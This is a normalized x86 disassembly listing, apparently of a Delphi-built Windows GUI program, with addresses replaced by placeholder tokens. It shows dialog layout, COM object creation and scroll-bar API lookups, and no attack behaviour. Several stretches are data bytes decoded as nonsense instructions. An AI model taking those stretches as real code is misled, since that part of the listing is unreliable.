call sub_3a64370
sub_3aa07a6
mov eax [ ebp - 0xc ]
mov si 0xffef
call sub_3a6457c
mov eax [ ebp - 0x10 ]
call sub_3ac41cc
mov [ ebp - 0x18 ] eax
call sub_3ac4024
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_3aa087f
push [ fs : edx ]
mov [ fs : edx ] esp
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aa0090
lea edx [ ebp - 0x20 ]
push edx
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
xor edx edx
push ebp
push sub_3aa0851
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax 0x80000000
sete al
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x11 ] 0x0
je r-xdata
sub eax 0xffffffec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa0858
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x34 ]
test eax 0x80000000
sete al
mov [ ebp - 0x11 ] al
sub_3aa0858
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa0886
mov eax [ ebp - 0x18 ]
call sub_3ac4290
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_3ac402c
retn
sub_3aa093f
add [ ebx + 0x56 ] dl
push edi
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov ebx eax
test ebx 0x80000000
jne r-xdata
mov eax edi
call sub_3aa0bb0
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffee
call sub_3a6457c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
sub_3aa0980
push ebx
push esi
push edi
mov ebx eax
lea eax [ ebx + 0x44 ]
call sub_3a652a0
lea eax [ ebx + 0x64 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
mov edi eax
test edi 0x80000000
jne r-xdata
lea eax [ ebx + 0x64 ]
call sub_3a66cb4
mov eax edi
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x64 ]
mov eax ebx
mov si 0xffe6
call sub_3a6457c
mov edi eax
test edi 0x80000000
jne r-xdata
mov eax ebx
mov si 0xffed
call sub_3a6457c
sub_3aa09d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a66d28
xor eax eax
push ebp
push sub_3aa0a5a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x44 ]
call sub_3a652a0
lea eax [ ebx + 0x64 ]
mov edx [ ebp - 0x4 ]
call sub_3a66ccc
lea ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x64 ]
mov eax ebx
mov si 0xffe6
call sub_3a6457c
mov esi eax
test esi 0x80000000
jne r-xdata
lea eax [ ebx + 0x64 ]
call sub_3a66cb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa0a61
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
mov eax ebx
mov si 0xffec
call sub_3a6457c
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
sub_3aa0a90
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a66d28
xor eax eax
push ebp
push sub_3aa0ba0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3aa0bb0
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
mov edi eax
test edi 0x80000000
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa0ba7
lea eax [ ebp - 0x14 ]
call sub_3a652a0
lea eax [ ebp - 0xc ]
call sub_3a66cb4
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
push eax
push 0x1
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov edi eax
jmp r-xdata
mov eax edi
call sub_3a68150
test al al
je r-xdata
mov eax ebx
call sub_3aa0bb0
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_3aa0bb0
lea ecx [ ebp - 0x14 ]
xor edx edx
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x14 ]
lea eax [ ebx + 0x44 ]
call sub_3a652f4
lea ecx [ ebx + 0x44 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffe6
call sub_3a6457c
mov eax ebx
call sub_3aa0bb0
mov edx [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
push eax
push 0x1
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov edi eax
sub_3aa0bb4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_3a66d28
xor eax eax
push ebp
push sub_3aa0c55
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
push 0x80058000
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
test [ ebp - 0x5 ] 0x80
je r-xdata
test [ ebp - 0x5 ] 0x80
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa0c5c
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
xor eax eax
push ebp
push sub_3aa0c38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ ebp - 0xc ]
call sub_3a654c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call CoTaskMemFree
retn
sub_3aa0c64
push ebx
push esi
push edi
mov edi eax
lea eax [ edi + 0x64 ]
push eax
mov eax [ edi + 0x3c ]
push eax
mov eax [ eax ]
call [ eax + 0x50 ]
mov ebx eax
test ebx 0x80000000
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x44 ]
mov edx [ edi + 0x64 ]
mov eax edi
mov si 0xffe6
call sub_3a6457c
mov ebx eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx [ edi + 0x44 ]
mov eax [ edi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_3aa0cac
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3aa0d00
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebx + 0x3c ]
call sub_3a6efcc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa0d07
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
lea eax [ ebx + 0x58 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
sub_3aa0d0b
add [ ecx + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a66d28
xor eax eax
push ebp
push sub_3aa0daa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x44 ]
call sub_3a652a0
mov [ ebp - 0x9 ] 0x1
lea eax [ ebx + 0x64 ]
mov edx [ ebp - 0x4 ]
call sub_3a66ccc
lea ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x64 ]
mov eax ebx
mov si 0xffe6
call sub_3a6457c
mov edi eax
test edi 0x80000000
jne r-xdata
movzx eax [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
lea eax [ ebx + 0x64 ]
call sub_3a66cb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa0db1
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
lea edx [ ebp - 0x9 ]
mov eax ebx
mov si 0xffeb
call sub_3a6457c
sub_3aa0dbc
push ebx
push esi
push edi
mov ebx eax
lea eax [ ebx + 0x44 ]
call sub_3a652a0
lea eax [ ebx + 0x64 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
mov eax [ eax ]
call [ eax + 0x38 ]
mov edi eax
test edi 0x80000000
jne r-xdata
lea eax [ ebx + 0x64 ]
call sub_3a66cb4
mov eax edi
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x64 ]
mov eax ebx
mov si 0xffe6
call sub_3a6457c
mov edi eax
test edi 0x80000000
jne r-xdata
mov eax ebx
mov si 0xffea
call sub_3a6457c
sub_3aa0e14
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x30 ]
call sub_3a656c8
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
test esi esi
je r-xdata
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_3a652f4
mov edx esp
mov eax esi
call sub_3a69100
sub_3aa0e48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx esi
call sub_3a656c8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_3a652f4
sub_3aa0e68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x44 ]
call sub_3a656c8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
mov edx esi
call sub_3a652f4
sub_3aa0eb0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a66d28
xor eax eax
push ebp
push sub_3aa0f3e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x44 ]
call sub_3a652a0
mov [ ebp - 0x9 ] 0x1
lea eax [ ebx + 0x64 ]
mov edx [ ebp - 0x4 ]
call sub_3a66ccc
lea ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x64 ]
mov eax ebx
mov si 0xffe6
call sub_3a6457c
mov edi eax
test edi 0x80000000
jne r-xdata
movzx eax [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
lea eax [ ebx + 0x64 ]
call sub_3a66cb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa0f45
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
lea edx [ ebp - 0x9 ]
mov eax ebx
mov si 0xffe9
call sub_3a6457c
sub_3aa0f50
push ebx
push esi
push edi
mov ebx eax
lea eax [ ebx + 0x50 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov edi eax
cmp [ ebx + 0xaa ] 0x0
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
test edi 0x80000000
jne r-xdata
mov eax ebx
mov si 0xffe8
call sub_3a6457c
sub_3aa0f88
push ebx
mov ebx edx
mov eax ebx
call sub_3a66cb4
push eax
push r-xdata
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
pop ebx
retn
sub_3aa0fa9
add [ eax ] al
add [ eax - 0x522a838e ] cl
aam 0x68
inc edi
mov esi 0x95969d02
xor bl cl
pushad
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_3aa1031
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebx + 0x60 ] 0x80
jne r-xdata
lea eax [ ebx + 0x68 ]
push eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x3c ]
mov ecx r-xdata
call sub_3a66cf8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x6c ]
mov esi eax
test esi 0x80000000
jne r-xdata
mov eax ebx
call sub_3aa0c64
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa1038
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
mov edx [ ebx + 0x68 ]
mov eax ebx
mov si 0xffe7
call sub_3a6457c
mov esi eax
sub_3aa103f
add [ eax - 0x522a838e ] cl
aam 0x68
inc edi
mov esi 0x95969d02
xor bl cl
pushad
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_3aa10ee
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebx + 0x60 ] 0x80
jne r-xdata
lea eax [ ebx + 0x68 ]
push eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x3c ]
mov ecx r-xdata
call sub_3a66cf8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x70 ]
mov edi eax
test edi 0x80000000
jne r-xdata
mov eax ebx
call sub_3aa0dbc
mov edi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa10f5
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
mov edx [ ebx + 0x68 ]
mov eax ebx
mov si 0xffe7
call sub_3a6457c
mov edi eax
test edi 0x80000000
jne r-xdata
lea eax [ ebx + 0x68 ]
call sub_3a66cb4
lea eax [ ebx + 0x64 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
mov eax [ eax ]
call [ eax + 0x38 ]
mov eax ebx
mov si 0xffea
call sub_3a6457c
sub_3aa10fd
add [ eax ] al
add [ eax - 0x522a838e ] cl
aam 0x68
inc edi
mov esi 0x95969d02
xor bl cl
pushad
push ebx
mov ebx edx
mov eax ebx
call sub_3a66cb4
push eax
push r-xdata
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
pop ebx
retn
sub_3aa1144
push ebx
push esi
add esp 0xffffffcc
mov ebx edx
mov esi eax
xor eax eax
mov edx esp
lea ecx [ eax + 0x41 ]
mov [ edx ] cl
inc eax
inc edx
cmp eax 0x1a
jne r-xdata
xor eax eax
lea edx [ esp + 0x1a ]
lea ecx [ eax + 0x61 ]
mov [ edx ] cl
inc eax
inc edx
cmp eax 0x1a
jne r-xdata
push ebx
push 0x34
lea eax [ esp + 0x8 ]
push eax
mov eax esi
call sub_3a8a340
push eax
call GetTextExtentPointA
mov ecx 0x34
mov eax [ ebx ]
cdq
idiv ecx
mov [ ebx ] eax
add esp 0x34
pop esi
pop ebx
retn
sub_3aa123c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3aa1544
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ac5bc8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3aa151a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_3ac7fe0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x68 ]
call sub_3a8a25c
mov eax [ ebp - 0xc ]
call sub_3ac7fe0
lea edx [ ebp - 0x14 ]
call sub_3aa1144
mov dl 0x3
mov eax [ ebp - 0xc ]
call sub_3ac7c04
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_3aafbb8
push 0x4
mov eax [ ebp - 0x14 ]
push eax
push 0xb4
call MulDiv
mov edx eax
mov eax [ ebp - 0xc ]
call sub_3ac6d58
mov dl 0x4
mov eax [ ebp - 0xc ]
call sub_3ac852c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a956b0
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov edx edi
mov eax esi
call sub_3aafbb8
push 0x4
mov eax [ ebp - 0x14 ]
push eax
push 0x8
call MulDiv
mov edx eax
mov eax esi
call sub_3aaf210
push 0x8
mov eax [ ebp - 0x10 ]
push eax
push 0x8
call MulDiv
mov edx eax
mov eax esi
call sub_3aaf244
push 0x4
mov eax [ ebp - 0x14 ]
push eax
push 0xa4
call MulDiv
mov ecx eax
mov eax [ esi + 0x74 ]
mov edx 0x1
call sub_3aae4f4
mov dl 0x1
mov eax esi
call sub_3a9607c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a961a8
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov edx [ esi + 0x40 ]
mov eax ebx
call sub_3aaf210
mov edx [ esi + 0x44 ]
add edx [ esi + 0x4c ]
add edx 0x5
mov eax ebx
call sub_3aaf244
push 0x4
mov eax [ ebp - 0x14 ]
push eax
push 0xa4
call MulDiv
mov edx eax
mov eax ebx
call sub_3aaf278
mov edx 0xff
mov eax ebx
call sub_3a962e4
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
call sub_3aafbb8
mov eax ebx
call sub_3a96550
mov edi [ ebx + 0x44 ]
add edi [ ebx + 0x4c ]
add edi 0xf
push 0x4
mov eax [ ebp - 0x14 ]
push eax
push 0x32
call MulDiv
mov [ ebp - 0x18 ] eax
push 0x8
mov eax [ ebp - 0x10 ]
push eax
push 0xe
call MulDiv
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a989c4
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_3a67194
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_3aafbb8
mov [ esi + 0x25c ] 0x1
mov dl 0x1
mov eax esi
call sub_3a98aa8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push 0x4
mov eax [ ebp - 0x14 ]
push eax
push 0x26
call MulDiv
mov edx eax
mov ecx edi
mov eax esi
mov esi [ eax ]
call [ esi + 0x88 ]
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a989c4
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_3a67194
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_3aafbb8
mov [ esi + 0x25c ] 0x2
mov [ esi + 0x259 ] 0x1
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push 0x4
mov eax [ ebp - 0x14 ]
push eax
push 0x5c
call MulDiv
mov edx eax
mov ecx [ ebx + 0x44 ]
add ecx [ ebx + 0x4c ]
add ecx 0xf
mov eax esi
mov edi [ eax ]
call [ edi + 0x88 ]
mov edx [ esi + 0x44 ]
add edx [ esi + 0x4c ]
add edx 0xd
mov eax [ ebp - 0xc ]
call sub_3ac6d8c
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xfc ]
dec eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa1521
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_3aafb88
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_3a652f4
mov [ ebp - 0x5 ] 0x1
sub_3aa1558
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_3a652f4
mov ecx ebx
mov edx edi
mov eax esi
call sub_3aa123c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_3aa1588
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_3a6a7d0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_3aa1623
add [ edi ] cl
add [ eax ] al
add ah bh
lds ebp [ edi - 0x4fe95bfd ]
add eax [ eax ]
add [ eax ] al
add al bh
lds ebp [ edi - 0x4fe6c7fd ]
add eax [ eax ]
add [ eax ] al
add ah dh
lds ebp [ edi - 0x4fe97ffd ]
add eax [ eax ]
add [ eax ] al
add al dh
lds ebp [ edi - 0x4fe577fd ]
add eax [ eax ]
add [ eax ] al
add ah ch
lds ebp [ edi - 0x4fe69ffd ]
add eax [ eax ]
add [ eax ] al
add al ch
lds ebp [ edi - 0x4fe71ffd ]
add eax [ eax ]
add [ eax ] al
add ah ah
lds ebp [ edi - 0x4fe607fd ]
add eax [ eax ]
add [ eax ] al
add al ah
lds ebp [ edi - 0x4fe7fbfd ]
add eax [ eax ]
add [ eax ] al
add ah bl
lds ebp [ edi - 0x4fe703fd ]
add eax [ eax ]
add [ eax ] al
add al bl
lds ebp [ edi - 0x4fe7d3fd ]
add eax [ eax ]
add [ eax ] al
add ah dl
lds ebp [ edi - 0x4fe4f3fd ]
add eax [ eax ]
add [ eax ] al
add [ eax - 0x1bfc503b ] ah
push ss
mov al 0x3
add [ eax ] al
add [ eax ] al
pushfd
lds ebp [ edi - 0x4fe597fd ]
add eax [ eax ]
add [ eax ] al
add [ eax - 0x53fc503b ] bl
sbb dh [ eax + 0x3 ]
add [ ebp + eax * 8 + 0x188403af ] dl
mov al 0x3
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3aa172f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa1736
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_3a65e38
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_3aa1738
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3aa1769
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa1770
retn
mov eax [ rw-data ]
call sub_3a64380
sub_3aa1868
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3ac0b40
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aa18a4
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_3aa18d8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_3aa1900
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_3aa1b82
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3aa1ba9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa1bb0
retn
sub_3aa2406
out dx al
inc [ edx + edi * 2 ]
stosb [ edi ]
add ebp [ edx + edi * 2 ]
stosb [ edi ]
add edi [ ecx + edi * 2 - 0x7fbbfc56 ]
stosb [ edi ]
add eax [ 0x6e654d54 ]
jne r-xdata
cmpsb [ esi ] [ edi ]
add ecx esp
jns r-xdata
shl [ esp ] 0xaa
add eax [ edi ]
add eax 0x6e654d54
jne r-xdata
jae r-xdata
add esi [ ebx + ebp * 4 + 0x39f403a7 ]
test al 0x3
shr [ edx - 0x7bf3fc59 ] 0x1
stosb [ edi ]
add ebp [ eax - 0x23fc557c ]
and [ ecx - 0x56 ] bh
add esi esp
sub [ edx - 0x5585dffd ] 0x3
and al 0x84
stosb [ edi ]
and ebp [ edx - 0x5873e7fd ]
add eax [ ebx ]
add [ 0x756e654d ] al
jae r-xdata
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
jb r-xdata
and al 0x20
stosb [ edi ]
add esi [ eax + eax ]
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] ah
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
stosb [ edi ]
add ebx esp
dec ecx
je r-xdata
add ecx [ esi ]
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c03a6 ] dl
add [ eax ] al
add al 0x0
std
inc eax
add [ esp + 0x3aa ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
and al 0xaa
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
and al 0xaa
add esp [ eax ]
add [ eax ] al
and ebp [ fs : edx - 0x57c20ffd ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ecx esp
jns r-xdata
insd
